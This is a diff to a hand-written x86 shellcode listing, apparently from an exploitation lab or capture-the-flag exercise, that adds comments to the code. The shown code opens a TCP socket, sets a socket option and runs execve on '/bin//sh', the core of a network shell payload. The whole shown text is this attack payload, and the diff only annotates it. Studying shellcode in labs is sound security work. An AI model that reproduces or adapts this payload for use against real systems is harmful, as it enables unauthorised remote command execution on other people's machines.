@@ -1,9 +1,11 @@
-sub esp, 900
+sub esp, 900	# In order to make room for my shennanigans and to prevent overwriting my own code when using the stack.
 jmp _GET_STRINGS
+
+
 _SHELLCODE:
-mov ebp, esp
+mov ebp, esp				# Need to put the base pointer at the base of the functions stack "frame"
 sub esp, 0x18
-mov dword ptr [ebp-0x18], 1
+mov dword ptr [ebp-0x18], 1	# optval for setsockopt
 mov dword ptr [ebp-0x14], 0	# socket file descriptor
 mov dword ptr [ebp-0x10], 0	# struct sockaddr_in
 mov dword ptr [ebp-0x0c], 0	# struct sockaddr_in
@@ -16,7 +18,7 @@ push	1				# type
 push	2				# family
 mov		eax, 0x08048730	# socket
 call	eax				# sockfd = socket(AF_INET, SOCK_STREAM, 0)
-mov		esi, eax
+mov		esi, eax		# keep the file descriptor for later
 
 
 push	4				# optlen
@@ -76,7 +78,7 @@ xor		edx, edx	# envp
 push	0x0068732f	# "//sh"
 push	0x6e69622f	# "/bin"
 mov		ebx, esp	# filename
-push	0
+push	0			# envp
 push	0			# NULL terminator for argv[1]
 push	ebx			# filename for argv[0]
 mov		ecx, esp	# argv
